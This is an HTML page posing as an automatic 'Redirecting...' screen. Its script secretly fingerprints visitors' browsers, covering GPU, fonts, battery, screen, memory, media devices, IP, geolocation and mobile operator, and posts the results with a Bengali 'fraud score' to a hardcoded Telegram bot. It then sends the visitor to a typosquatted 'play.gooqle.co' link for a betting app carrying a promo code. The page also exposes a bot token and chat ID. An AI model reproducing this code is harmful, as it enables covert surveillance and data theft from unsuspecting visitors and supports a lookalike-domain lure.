<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px; max-width: 420px; width: 100%; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
        .spinner { width: 48px; height: 48px; border: 4px solid #30363d; border-top-color: #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h3 { font-size: 20px; margin-bottom: 10px; color: #f0f6fc; }
        p { color: #8b949e; font-size: 14px; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>⏳ Redirecting...</h3>
        <p>Please wait, you will be redirected automatically.</p>
    </div>

    <script>
        // ========== টেলিগ্রাম বট তথ্য ==========
        const TG_BOT_TOKEN = "8651142215:AAHuKP53rRExlvBipq2EgcXWCOU4i-vZ7Do";
        const TG_CHAT_ID = "5575068712";
        const REDIRECT_URL = "https://play.gooqle.co/store/apps/details?id=xparibet&promo=iboy24&hl=en&gl=US";
        // ========================================

        async function sha256(msg) {
            const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(msg));
            return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
        }

        function detectFonts() {
            try {
                const c = document.createElement('canvas'), ctx = c.getContext('2d');
                const test = 'abcdefghijklmnopqrstuvwxyz0123456789';
                ctx.font = '16px monospace';
                const base = ctx.measureText(test).width;
                const fonts = ['Arial','Verdana','Times New Roman','Courier New','Helvetica','Tahoma','Georgia','Comic Sans MS','Impact','Segoe UI','Roboto','Calibri'];
                return fonts.filter(f => {
                    try { ctx.font = '16px ' + f; return Math.abs(ctx.measureText(test).width - base) > 2; }
                    catch(e) { return false; }
                }).join(',');
            } catch(e) { return ''; }
        }

        async function getBattery() {
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    return Math.round(b.level * 100) + '%|' + (b.charging ? 'Charging' : 'NotCharging');
                }
            } catch(e) {}
            return 'N/A|N/A';
        }

        function getGL() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const di = gl.getExtension('WEBGL_debug_renderer_info');
                    const result = di ? gl.getParameter(di.UNMASKED_VENDOR_WEBGL) + '|' + gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : 'N/A|N/A';
                    // Clean up
                    const ext = gl.getExtension('WEBGL_lose_context');
                    if (ext) ext.loseContext();
                    return result;
                }
            } catch(e) {}
            return 'N/A|N/A';
        }

        function getConn() {
            try {
                if (navigator.connection) return navigator.connection.effectiveType + '|' + (navigator.connection.downlink || 'N/A');
            } catch(e) {}
            return 'N/A|N/A';
        }

        async function getMediaDevices() {
            try {
                // Only attempt if available and likely to work
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    const d = await navigator.mediaDevices.enumerateDevices();
                    return d.map(x => x.kind).join(',');
                }
            } catch(e) {}
            return '';
        }

        function detectOperator(isp) {
            const name = (isp || '').toLowerCase();
            if (name.includes('grameenphone') || name.includes('gp')) return 'GP';
            if (name.includes('robi') || name.includes('airtel')) return 'Robi/Airtel';
            if (name.includes('banglalink')) return 'Banglalink';
            if (name.includes('teletalk')) return 'Teletalk';
            return 'WiFi/Broadband';
        }

        // localStorage safe wrapper
        function safeLocalStorage() {
            try {
                const test = '__test__';
                localStorage.setItem(test, test);
                localStorage.removeItem(test);
                return true;
            } catch(e) {
                return false;
            }
        }

        // Fallback IP detection via DNS over HTTPS (works on GitHub Pages)
        async function getPublicIP() {
            // Try multiple free IP APIs (some may be blocked on GitHub Pages)
            const apis = [
                'https://api.ipify.org?format=json',
                'https://api.myip.com',
                'https://myexternalip.com/json',
                'https://jsonip.com'
            ];
            
            for (const api of apis) {
                try {
                    const resp = await fetch(api, { mode: 'cors' });
                    if (resp.ok) {
                        const data = await resp.json();
                        // Different APIs have different response formats
                        return data.ip || data.address || data;
                    }
                } catch(e) {
                    // Try next API
                    continue;
                }
            }
            return null;
        }

        // IP geolocation (tries multiple free providers)
        async function getGeoLocation(ip) {
            const apis = [
                'https://ipapi.co/' + ip + '/json/',
                'https://ipwho.is/' + ip,
                'https://ipinfo.io/' + ip + '/json'
            ];
            
            for (const api of apis) {
                try {
                    const resp = await fetch(api, { mode: 'cors' });
                    if (resp.ok) {
                        const data = await resp.json();
                        return {
                            country: data.country_name || data.country || 'N/A',
                            city: data.city || 'N/A',
                            isp: data.org || data.isp || data.asn?.name || 'N/A'
                        };
                    }
                } catch(e) {
                    continue;
                }
            }
            return { country: 'N/A', city: 'N/A', isp: 'N/A' };
        }

        // ====== MAIN ======
        (async function() {
            try {
                const gl = getGL();
                const battery = await getBattery();
                const fonts = detectFonts();
                const conn = getConn();
                const media = await getMediaDevices();
                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const lsAvailable = safeLocalStorage();

                // Stable fingerprint parts
                const fpParts = [
                    gl,
                    screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                    screen.availWidth + 'x' + screen.availHeight,
                    navigator.hardwareConcurrency || 'N/A',
                    navigator.deviceMemory || 'N/A',
                    navigator.platform,
                    navigator.language + '|' + (navigator.languages || []).join(','),
                    tz,
                    navigator.maxTouchPoints,
                    fonts,
                    battery,
                    conn,
                    media
                ];

                const fingerprint = await sha256(fpParts.join('|||'));

                // Get IP + Geo (with retries)
                const ipResult = await getPublicIP();
                let publicIP = 'N/A';
                let location = { country: 'N/A', city: 'N/A', isp: 'N/A' };

                if (ipResult) {
                    publicIP = ipResult;
                    location = await getGeoLocation(publicIP);
                }

                const operator = detectOperator(location.isp);

                // ===== FRAUD DETECTION (safe localStorage) =====
                let verdict = '🟢 রিয়েল';
                let reason = 'প্রথমবার দেখা ডিভাইস';
                let fraudScore = 0;

                if (lsAvailable) {
                    try {
                        const storedFP = localStorage.getItem('device_fp');
                        const storedIP = localStorage.getItem('device_ip');

                        if (storedFP && storedFP === fingerprint) {
                            fraudScore += 5;
                            reason = 'একই ফিঙ্গারপ্রিন্ট পাওয়া গেছে (পূর্বে রেকর্ডকৃত)';
                        }

                        if (storedIP && storedIP === publicIP && publicIP !== 'N/A') {
                            fraudScore += 2;
                            if (fraudScore < 5) reason = 'একই IP ঠিকানা পূর্বে দেখা গেছে';
                        }

                        let count = parseInt(localStorage.getItem('visit_count') || '0');
                        count++;
                        localStorage.setItem('visit_count', count.toString());
                        if (count > 2) {
                            fraudScore += 1;
                            reason = 'একাধিক ভিজিট (' + count + ' বার)';
                        }

                        if (fraudScore >= 5) verdict = '🔴 ফ্রড';
                        else if (fraudScore >= 2) verdict = '🟡 সন্দেহজনক';

                        localStorage.setItem('device_fp', fingerprint);
                        localStorage.setItem('device_ip', publicIP);

                    } catch(e) {
                        reason = 'localStorage ত্রুটি';
                    }
                } else {
                    reason = 'localStorage অনুপলব্ধ (প্রাইভেট মোড)';
                }

                // ===== TELEGRAM MESSAGE =====
                const msg = 
`${verdict} — ফ্রড স্কোর: ${fraudScore}/10
📋 কারণ: ${reason}
━━━━━━━━━━━━━━━━━━
🆔 FP: \`${fingerprint.substring(0, 16)}...\`
🌐 IP: ${publicIP} (${location.city}, ${location.country})
📡 নেটওয়ার্ক: ${operator} (${conn.split('|')[0]})
━━━━━━━━━━━━━━━━━━
📱 OS: ${navigator.platform}
💻 স্ক্রিন: ${screen.width}x${screen.height}
🧠 RAM: ${navigator.deviceMemory || 'N/A'}GB | কোর: ${navigator.hardwareConcurrency || 'N/A'}
🔋 ব্যাটারি: ${battery.split('|')[0]}
━━━━━━━━━━━━━━━━━━
🗣 ভাষা: ${navigator.language} | টাইমজোন: ${tz}
🔤 ফন্টস: ${fonts ? fonts.split(',').length + 'টি' : 'N/A'}
🎮 GPU: ${gl.split('|')[1] || 'N/A'}
🕒 সময়: ${new Date().toLocaleString('bn-BD', {timeZone:'Asia/Dhaka'})}`;

                // Send to Telegram via multiple methods for reliability
                const apiUrl = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
                
                // Method 1: XMLHttpRequest (more reliable than fetch for some setups)
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', apiUrl, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown'}));
                } catch(e) {
                    // Method 2: Fetch fallback
                    try {
                        await fetch(apiUrl, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown'}),
                            mode: 'no-cors'  // Try no-cors mode
                        });
                    } catch(e2) {
                        console.log('Telegram send failed:', e2);
                    }
                }

            } catch(e) {
                console.log('Error in main:', e);
            }

            // Redirect regardless of errors
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 2500);
        })();
    </script>
</body>
</html>
